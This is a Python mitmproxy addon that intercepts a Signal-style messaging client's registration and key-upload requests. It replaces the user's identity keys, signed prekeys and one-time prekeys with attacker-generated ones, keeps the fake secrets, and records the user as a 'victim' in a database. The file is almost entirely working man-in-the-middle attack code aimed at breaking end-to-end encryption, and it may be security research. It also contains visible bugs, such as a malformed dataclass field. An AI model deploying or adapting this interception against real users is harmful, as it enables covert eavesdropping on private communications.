from mitmproxy.http import HTTPFlow
#from mitmproxy import ctx
from dataclasses import dataclass
from typing import Optional
import logging
from xepor import InterceptedAPI, RouteType, HTTPVerb
import json
from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers
from base64 import b64decode, b64encode
from database import *
from utils import *

# from server_proto import *
from server_proto import addons, HOST_HTTPBIN


registration_info = dict()

@dataclass
class RegistrationInfo():
    aci = Optional[str] = None
    pni = Optional[str] = None
    unidentifiedAccessKey: Optional[str] = None
    ######## Legitimate keys
    aci_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    pni_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    aci_SignedPreKey: Optional[dict] = None
    pni_SignedPreKey: Optional[dict] = None
    aci_pq_lastResortKey: Optional[dict] = None
    pni_pq_lastResortKey: Optional[dict] = None
    aci_PreKeys: Optional[dict] = None
    pni_PreKeys: Optional[dict] = None
    aci_pq_PreKeys: Optional[dict] = None
    pni_pq_PreKeys: Optional[dict] = None
    ####### Fake keys
    aci_fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    pni_fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    aci_fake_SignedPreKeys: Optional[dict] = None
    aci_fake_secret_SignedPreKeys: Optional[dict] = None
    pni_fake_SignedPreKeys: Optional[dict] = None
    pni_fake_secret_SignedPreKeys: Optional[dict] = None

    aci_fake_PreKeys: Optional[dict] = None
    aci_fake_secret_PreKeys: Optional[dict] = None
    pni_fake_PreKeys: Optional[dict] = None
    pni_fake_secret_PreKeys: Optional[dict] = None

    aci_fake_lastResortKey: Optional[dict] = None
    aci_fake_secret_lastResortKey: Optional[dict] = None
    pni_fake_lastResortKey: Optional[dict] = None
    pni_fake_secret_lastResortKey: Optional[dict] = None

api = addons[0]

@api.route("/v1/registration", rtype = RouteType.REQUEST)
def _v1_registration(flow: HTTPFlow):

    logging.info(f"ADDRESS {flow.client_conn.address[0]}")

    req = json.loads(flow.request.content)
    logging.info(json.dumps(req, indent=4))

    qry = Device.select().where(Device.aciIdenKey == req["aciIdentityKey"])

    logging.info(f"QUERY: {qry}")

    unidentifiedAccessKey = req['accountAttributes']['unidentifiedAccessKey']

    aci_IdenKey = req['aciIdentityKey']
    pni_IdenKey = req['pniIdentityKey']

    aci_SignedPreKey = req['aciSignedPreKey']
    pni_SignedPreKey = req['pniSignedPreKey']

    aci_pq_lastResortKey = req['aciPqLastResortPreKey']
    pni_pq_lastResortKey = req['pniPqLastResortPreKey']

    aci_fake_IdenKey = identity_key.IdentityKeyPair.generate()
    pni_fake_IdenKey = identity_key.IdentityKeyPair.generate()

    fake_signed_pre_keys, fake_secret_SignedPreKeys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey)

    req.update(fake_signed_pre_keys)

    registration_info[flow.client_conn.address[0]] = RegistrationInfo(
                                                    unidentifiedAccessKey = unidentifiedAccessKey,
                                                    aci_IdenKey = aci_IdenKey, 
                                                    pni_IdenKey= pni_IdenKey, 
                                                    aci_SignedPreKey = aci_SignedPreKey,
                                                    pni_SignedPreKey = pni_SignedPreKey,
                                                    aci_pq_lastResortKey = aci_pq_lastResortKey,
                                                    pni_pq_lastResortKey = pni_pq_lastResortKey, 

                                                    aci_fake_IdenKey = aci_fake_IdenKey, 
                                                    pni_fake_IdenKey = pni_fake_IdenKey,
                                                    aci_fake_SignedPreKeys = fake_signed_pre_keys["aciSignedPreKey"], 
                                                    aci_fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
                                                    pni_fake_SignedPreKeys = fake_signed_pre_keys["pniSignedPreKey"],
                                                    pni_fake_secret_SignedPreKeys = fake_secret_SignedPreKeys["pniSignedPreKeySecret"],

                                                    aci_fake_lastResortKey = fake_signed_pre_keys["aciPqLastResortPreKey"],
                                                    aci_fake_secret_lastResortKey = fake_secret_SignedPreKeys["aciPqLastResortSecret"],
                                                    pni_fake_lastResortKey = fake_signed_pre_keys["pniPqLastResortPreKey"],
                                                    pni_fake_secret_lastResortKey = fake_secret_SignedPreKeys["pniPqLastResortSecret"],
                                                                    )

    #logging.info(f"REGISTRATION INFO: {registration_info}")
    #logging.exception(f"{registration_info}")
    ### TODO: create the Alice classes 

    logging.info(f"POST {json.loads(flow.request.content.decode())}")
    flow.request.content = json.dumps(req).encode()

@api.route("/v1/registration", rtype = RouteType.RESPONSE)
def _v1_registration(flow: HTTPFlow):

    resp = json.loads(flow.response.content)
    logging.info(f"RESPONSE: {resp}")
    ip_address = flow.client_conn.address[0]

    user = User.insert(
        pNumber = resp["number"],
        aci = resp["uuid"],
        pni = resp["pni"],
        isVictim = True
    )

    logging.info(registration_info)

    device = Device.insert(
        aci = resp["uuid"],
        pni = resp["pni"],
        deviceId = 1,
        aciIdenKey = registration_info[ip_address].aci_IdenKey,
        pniIdenKey = registration_info[ip_address].pni_IdenKey,
        unidentifiedAccessKey = registration_info[ip_address].unidentifiedAccessKey,
    )

    user.on_conflict_replace().execute()
    device.on_conflict_replace().execute()

    registration_info[ip_address].aci = resp["uuid"]
    registration_info[ip_address].pni = resp["pni"]
    

@api.route("/v2/keys", rtype = RouteType.REQUEST, method = HTTPVerb.PUT)
def _v2_keys(flow: HTTPFlow):

    identity = flow.request.query["identity"]

    logging.info(flow.request.content)

    req = json.loads(flow.request.content)
    address = flow.client_conn.address[0]

    if identity == "aci":
        try:
            alice_identity_key_pair = registration_info[address].aci_fake_IdenKey
        except KeyError:
            logging.exception(f"{flow} AND {registration_info}")

        pq_pre_keys = req["pqPreKeys"]
        pre_keys = req["preKeys"]

        registration_info[address].aci_pq_PreKeys = pq_pre_keys
        registration_info[address].aci_PreKeys = pre_keys

        fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)

        req.update(fake_pre_keys)

        registration_info[address].fake_PreKeys = fake_pre_keys
        registration_info[address].fake_secret_PreKeys = fake_secret_PreKeys
        registration_info[address].aci_pq_PreKeys = pq_pre_keys
        registration_info[address].aci_secret_pq_PreKeys = fake_secret_PreKeys

        legit_bundle = LegitBundle.insert(
            type = "aci",
            aci = registration_info[address].aci,
            deviceId = 1,
            aciSignedPreKey = registration_info[address].aci_SignedPreKey,
            aciPreKeys = registration_info[address].aci_PreKeys,
            kyberKeys = registration_info[address].aci_pq_PreKeys,
            lastResortKyber = registration_info[address].aci_pq_lastResortKey
        )

        mitm_bundle = MitMBundle.insert(
            type = "aci",
            aci = registration_info[address].aci,
            deviceId = 1,
            aciFakeIdenKey = registration_info[address].aci_fake_IdenKey,
            aciFakeSignedPreKey = registration_info[address].aci_fake_SignedPreKeys,
            aciFakePrekeys = registration_info[address].aci_fake_PreKeys,
            fakeKyberKeys = registration_info[address].aci_pq_PreKeys,
            lastResortKyber = registration_info[address].aci_pq_lastResortKey
        )

        legit_bundle.on_conflict_replace().execute()
        mitm_bundle.on_conflict_replace().execute()

    elif identity == "pni":
        alice_identity_key_pair = registration_info[address].pni_fake_IdenKey

        pq_pre_keys = req["pqPreKeys"]
        pre_keys = req["preKeys"]

        registration_info[address].pni_pq_PreKeys = pq_pre_keys
        registration_info[address].pni_PreKeys = pre_keys

        fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)

        req.update(fake_pre_keys)

        registration_info[address].fake_PreKeys = fake_pre_keys
        registration_info[address].fake_secret_PreKeys = fake_secret_PreKeys
        registration_info[address].pni_pq_PreKeys = pq_pre_keys
        registration_info[address].pni_secret_pq_PreKeys = fake_secret_PreKeys

        legit_bundle = LegitBundle.insert(
            type = "pni",
            aci = registration_info[address].aci,
            deviceId = 1,
            aciSignedPreKey = registration_info[address].pni_SignedPreKey,
            aciPreKeys = registration_info[address].pni_PreKeys,
            kyberKeys = registration_info[address].pni_pq_PreKeys,
            lastResortKyber = registration_info[address].pni_pq_lastResortKey
        )

        mitm_bundle = MitMBundle.insert(
            type = "pni",
            aci = registration_info[address].aci,
            deviceId = 1,
            aciFakeIdenKey = registration_info[address].pni_fake_IdenKey,
            aciFakeSignedPreKey = registration_info[address].pni_fake_SignedPreKeys,
            aciFakePrekeys = registration_info[address].pni_fake_PreKeys,
            fakeKyberKeys = registration_info[address].pni_pq_PreKeys,
            lastResortKyber = registration_info[address].pni_pq_lastResortKey
        )

        legit_bundle.on_conflict_replace().execute()
        mitm_bundle.on_conflict_replace().execute()

    flow.request.content = json.dumps(req).encode()


# @api.route("/v1/verification") 
# def _v1_verification(flow):
#     logging.info(flow.request.content)

#     req = json.loads(flow.request.content)
#     number = req["number"]
#     user = User.create(pNumber = number, isVictim = True)

#     qry = User.select()

#     logging.info(f"user: {user}")

@api.route("/v2/keys/{identifier}/{device_id}", rtype = RouteType.RESPONSE, method = HTTPVerb.GET)
def v2_keys_identifier_device_id(flow, identifier, device_id):
    #logging.exception((flow.response.content, identifier, device_id))

    resp = json.loads(flow.response.content)
    address = flow.client_conn.address[0]

    fake_keys, fake_keys_secret = helpers.create_keys_data(100, registration_info[address].aci_fake_IdenKey)
    registration_info[address].fake_PreKeys = fake_keys["preKeys"]
    registration_info[address].fake_secret_PreKeys = fake_keys_secret["pqPreKeys"]

    #resp.update(fake_keys)

    flow.response.content = json.dumps(resp).encode()


addons = [api]